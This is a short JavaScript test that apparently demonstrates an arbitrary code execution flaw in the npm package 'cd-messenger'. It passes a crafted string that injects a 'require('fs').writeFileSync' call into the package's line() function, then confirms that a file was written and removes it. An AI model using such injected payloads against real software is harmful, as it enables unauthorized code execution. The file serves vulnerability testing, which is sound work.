test("Arbitrary code execution in cd-messenger", () => {
  expect.assertions(2);
  const fs = require("fs");
  const a = require("cd-messenger");
  const path = "./cd-messenger";
  let payload = "red(); require('fs').writeFileSync('" + path + "',``); //";
  data = {};
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    a.line(payload);
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
